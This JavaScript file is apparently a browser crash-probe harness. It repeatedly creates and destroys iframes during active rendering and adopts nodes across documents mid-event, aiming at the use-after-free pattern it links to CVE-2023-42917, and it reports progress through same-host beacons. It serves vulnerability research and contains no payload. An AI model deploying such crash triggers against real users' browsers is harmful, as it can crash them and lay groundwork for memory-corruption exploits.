// p194 — Fixed iframe navigation crash tests
// Previous tests had infinite MutationObserver feedback loops (my bug).
// This version avoids feedback and tests actual iframe destruction
// during active rendering — the CVE-2023-42917 pattern.
//
// Beacon prefix: V194-

(function() {
  "use strict";

  var BASE = location.protocol + '//' + location.host;

  function syncB(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V194-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch(e) {}
  }

  syncB('BOOT');

  var tests = [
    {
      name: 'A',
      desc: 'plain iframe destroy',
      srcdoc: '<html><body><div style="width:100px;height:100px;background:red;"></div></body></html>'
    },
    {
      name: 'B',
      desc: 'setInterval + DOM writes, destroy mid-work',
      srcdoc: '<html><body><div id="t"></div><script>' +
        'var c=0;setInterval(function(){' +
        'var d=document.createElement("div");d.textContent="n"+c++;' +
        'document.getElementById("t").appendChild(d);' +
        'if(c>50)document.getElementById("t").innerHTML="";' +
        '},1);' +
        '</script></body></html>'
    },
    {
      name: 'C',
      desc: 'ResizeObserver only (no feedback loop)',
      srcdoc: '<html><body><div id="t" style="width:100px;height:100px;background:blue;"></div><script>' +
        'var ro=new ResizeObserver(function(e){});' +  // observe only, no modification
        'ro.observe(document.getElementById("t"));' +
        'var c=0;setInterval(function(){' +
        'document.getElementById("t").style.width=(50+c%200)+"px";c++;' +
        '},10);' +
        '</script></body></html>'
    },
    {
      name: 'D',
      desc: 'MutationObserver childList (no attribute feedback)',
      srcdoc: '<html><body><div id="t"></div><script>' +
        'var mo=new MutationObserver(function(m){});' +  // observe only
        'mo.observe(document.getElementById("t"),{childList:true,subtree:true});' +
        'var c=0;setInterval(function(){' +
        'var d=document.createElement("span");d.textContent=c++;' +
        'document.getElementById("t").appendChild(d);' +
        'if(c>30){document.getElementById("t").textContent="";}' +
        '},5);' +
        '</script></body></html>'
    },
    {
      name: 'E',
      desc: 'heavy layout + requestAnimationFrame',
      srcdoc: '<html><body><div id="t" style="position:relative;"></div><script>' +
        'var c=0;function frame(){' +
        'for(var i=0;i<20;i++){' +
        'var d=document.createElement("div");' +
        'd.style.cssText="position:absolute;width:"+(Math.random()*200)+"px;height:"+(Math.random()*200)+"px;background:rgb("+Math.floor(Math.random()*255)+",0,0);top:"+(Math.random()*200)+"px;left:"+(Math.random()*200)+"px;";' +
        'document.getElementById("t").appendChild(d);}' +
        'if(++c%5===0)document.getElementById("t").innerHTML="";' +
        'requestAnimationFrame(frame);}' +
        'requestAnimationFrame(frame);' +
        '</script></body></html>'
    },
    {
      name: 'F',
      desc: 'font loading + layout in iframe',
      srcdoc: '<html><body><style>@font-face{font-family:"t";src:url(data:font/woff;base64,d09GRgABAAAAAADcAAoAAAAAASAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABGRlRNAAABSAAAABwAAAAcZLn0K0dERUYAAAFkAAAAHAAAAB4AJwA2T1MvMgAAAMAAAAAyAAAAVlR5IngAAARoAAAAIgAAADQODgLQY21hcAAAAOQAAAAgAAAAJAAMABNnbHlmAAABBAAAABQAAAAUMwsMAGhlYWQAAAEYAAAAIgAAACYQAAAAaGhlYQAAAUAAAAAIAAAACAAAAAxobXR4AAABPAAAAAgAAAAIAAAADGxvY2EAAAEYAAAABgAAAAYACgAAbWF4cAAAASAAAAAgAAAAIAAFAAFuYW1lAAABYAAAADIAAAAyAA8AAHBvc3QAAAGUAAAAEAAAABAAAwABAAEAAIAAMAABAAIACgABAAEABAADAAgAAQAWAAMABwABAA)!important;}</style>' +
        '<div style="font-family:t;">Test text for font loading</div></body></html>'
    },
    {
      name: 'G',
      desc: 'adoptNode cross-doc during event (EventTarget UAF pattern)',
      srcdoc: '<html><body><div id="t"></div></body></html>'
    }
  ];

  var currentTest = 0;
  var REPS = 5;  // repeat each test 5 times for reliability

  function runTest() {
    if (currentTest >= tests.length) {
      syncB('ALL-DONE');
      return;
    }

    var test = tests[currentTest];
    var rep = 0;

    function doRep() {
      if (rep >= REPS) {
        syncB(test.name + '-PASS');
        currentTest++;
        setTimeout(runTest, 50);
        return;
      }
      rep++;

      var f = document.createElement('iframe');

      if (test.name === 'G') {
        // Special: EventTarget UAF pattern
        f.srcdoc = '<html><body><div id="t"></div></body></html>';
      } else {
        f.srcdoc = test.srcdoc;
      }

      document.body.appendChild(f);

      f.onload = function() {
        if (test.name === 'G') {
          // EventTarget UAF: adopt nodes cross-doc during events
          try {
            var a = document.createElement('div');
            var b = a.appendChild(document.createElement('div'));

            a.addEventListener('evt', function() {
              document.adoptNode(a);
              f.remove();
              f = null;
            });

            a.addEventListener('evt', function() {});

            b.addEventListener('evt', function() {
              try { f.contentDocument.adoptNode(a); } catch(e) {}
            });

            b.dispatchEvent(new Event('evt', {bubbles: true}));
          } catch(e) {}

          syncB(test.name + '-R' + rep);

          // GC pressure
          for (var g = 0; g < 5000; g++) { var t = new ArrayBuffer(64); }

          setTimeout(doRep, 50);
          return;
        }

        // For all other tests: let iframe work for 50ms then destroy
        setTimeout(function() {
          syncB(test.name + '-R' + rep + '-DESTROY');

          // Destroy while iframe is actively doing layout/rendering
          f.remove();
          f = null;

          // GC pressure to free iframe Document
          for (var g = 0; g < 10000; g++) { var t = new ArrayBuffer(64); }

          syncB(test.name + '-R' + rep + '-OK');
          setTimeout(doRep, 20);
        }, 50);
      };

      // Timeout fallback in case onload never fires
      setTimeout(function() {
        if (f && f.parentNode) {
          syncB(test.name + '-R' + rep + '-TIMEOUT');
          f.remove();
          f = null;
          setTimeout(doRep, 20);
        }
      }, 2000);
    }

    syncB(test.name + '-START');
    doRep();
  }

  runTest();
})();
